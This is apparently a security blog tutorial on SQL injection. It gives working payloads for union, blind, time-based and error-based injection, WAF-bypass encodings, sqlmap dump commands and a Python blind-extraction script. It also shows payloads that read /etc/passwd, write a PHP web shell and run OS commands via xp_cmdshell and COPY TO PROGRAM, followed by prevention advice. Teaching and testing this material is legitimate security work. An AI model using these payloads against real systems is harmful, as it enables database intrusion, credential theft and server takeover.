---
layout: post
title: "SQL Injection Fundamentals and Advanced Techniques"
description: "Comprehensive guide to SQL injection attack vectors, exploitation techniques, and defensive strategies. Learn from basic concepts to advanced pentesting methods used by security professionals."
date: 2025-07-21 10:00:00 +0000
categories: [Web Security, Penetration Testing]
tags: [sql-injection, web-security, testing, databases, burp-suite, owasp, pentesting, cybersecurity]
image: https://avatars.githubusercontent.com/buggymaytricks?s=1200
author: "buGGy (buggymaytricks)"
sitemap:
  priority: 0.8
  changefreq: monthly
---

# SQL Injection Fundamentals and Advanced Techniques

SQL injection remains one of the most critical web application vulnerabilities. This comprehensive guide covers everything from basic concepts to advanced exploitation techniques used by security professionals.

## Understanding SQL Injection

SQL injection occurs when user input is incorrectly sanitized and directly concatenated into SQL queries, allowing attackers to manipulate database logic.

### Basic Example

```php
// Vulnerable code
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

// Attack payload
username: admin' OR '1'='1' --
```

## Types of SQL Injection

### 1. Union-Based Injection

Extract data by combining results from multiple queries.

```sql
-- Determine number of columns
' ORDER BY 10--

-- Extract data
' UNION SELECT 1,2,3,database()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

### 2. Boolean-Based Blind Injection

Infer information based on application behavior changes.

```sql
-- Test for vulnerability
' AND 1=1--  (normal response)
' AND 1=2--  (different response)

-- Extract data character by character
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
```

### 3. Time-Based Blind Injection

Use time delays to extract information when no visible changes occur.

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server
'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

### 4. Error-Based Injection

Leverage error messages to extract data.

```sql
-- MySQL using ExtractValue
' AND ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e))--

-- MySQL using UpdateXML
' AND UpdateXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
```

## Database-Specific Techniques

### MySQL

```sql
-- Version detection
' AND @@version LIKE '8%'--

-- File reading (requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- File writing
' UNION SELECT 1,2,'<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php'--

-- Information gathering
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--
```

### PostgreSQL

```sql
-- Version detection
' AND version() LIKE 'PostgreSQL%'--

-- Command execution (if superuser)
'; COPY (SELECT '') TO PROGRAM 'id'--

-- Reading files
' UNION SELECT 1,pg_read_file('/etc/passwd'),3--
```

### Microsoft SQL Server

```sql
-- Version detection
' AND @@version LIKE 'Microsoft%'--

-- Command execution
'; EXEC xp_cmdshell 'whoami'--

-- Reading files
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_BLOB) AS t--
```

### Oracle

```sql
-- Version detection
' AND banner LIKE 'Oracle%' FROM v$version WHERE rownum=1--

-- Current user
' UNION SELECT 1,user,3 FROM dual--

-- All tables
' UNION SELECT 1,table_name,3 FROM all_tables--
```

## Advanced Evasion Techniques

### WAF Bypass Methods

```sql
-- Comment variations
/*comment*/ /*!50000comment*/ #comment --comment

-- Case manipulation
UnIoN SeLeCt

-- URL encoding
%55%4e%49%4f%4e %53%45%4c%45%43%54

-- Double encoding
%2555%254e%2549%254f%254e

-- Alternative keywords
SELECT -> EXEC, EXECUTE
UNION -> UNION ALL, UNION DISTINCT
```

### Function Alternatives

```sql
-- Instead of SUBSTRING
MID(), LEFT(), RIGHT(), SUBSTR()

-- Instead of CONCAT
MAKE_SET(), ELT(), INSERT()

-- Instead of ASCII
ORD(), HEX()

-- Instead of LENGTH
CHAR_LENGTH(), CHARACTER_LENGTH()
```

## Automated Testing Tools

### SQLMap

The most popular automated SQL injection tool.

```bash
# Basic usage
sqlmap -u "http://target.com/page.php?id=1"

# POST data testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Advanced options
sqlmap -u "target.com" --forms --crawl=2 --random-agent --batch

# Database enumeration
sqlmap -u "target.com" --dbs --tables --columns --dump
```

### Custom Python Scripts

```python
import requests
import string
import time

def blind_sqli_extract(url, injection_point, database_query):
    extracted_data = ""
    position = 1
    
    while True:
        found = False
        for char in string.ascii_lowercase + string.digits + '_':
            payload = f"' AND (SELECT SUBSTRING(({database_query}),{position},1))='{char}'--"
            
            response = requests.get(url, params={injection_point: payload})
            
            if "welcome" in response.text.lower():  # Adjust based on app behavior
                extracted_data += char
                found = True
                break
        
        if not found:
            break
        position += 1
    
    return extracted_data

# Usage
result = blind_sqli_extract(
    "http://target.com/search.php",
    "search",
    "SELECT database()"
)
```

## Second-Order SQL Injection

Sometimes injection occurs in a different context than where the payload is inserted.

```sql
-- Step 1: Register user with malicious payload
username: admin'/*

-- Step 2: Payload executes later in different query
SELECT * FROM posts WHERE author='admin'/*' AND status='published'
-- Results in: SELECT * FROM posts WHERE author='admin'
```

## NoSQL Injection

Modern applications using NoSQL databases have their own injection vectors.

```javascript
// MongoDB injection examples
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}}

// Authentication bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Prevention Strategies

### Parameterized Queries (Prepared Statements)

```php
// PHP PDO example
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```python
# Python example
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

### Input Validation

```python
import re

def validate_input(user_input, input_type):
    if input_type == "numeric":
        return user_input.isdigit()
    elif input_type == "alphanumeric":
        return re.match("^[a-zA-Z0-9]+$", user_input)
    return False
```

### Stored Procedures

```sql
CREATE PROCEDURE GetUser(@UserID INT)
AS
BEGIN
    SELECT * FROM Users WHERE ID = @UserID
END
```

## Testing Methodology

1. **Identify injection points**: Forms, URL parameters, headers
2. **Test for errors**: Submit single quotes, SQL keywords
3. **Determine DBMS**: Use version-specific payloads
4. **Map database structure**: Extract schema information
5. **Extract sensitive data**: Focus on user credentials, sensitive tables
6. **Document findings**: Provide clear proof-of-concept

## Conclusion

SQL injection remains a critical vulnerability that requires thorough understanding and testing. While automated tools are helpful, manual testing and understanding of database-specific behaviors are essential for comprehensive security assessment.

Remember: Always test within authorized environments and follow responsible disclosure practices.

---

*Have you encountered interesting SQL injection scenarios? Share your experiences in the comments!*
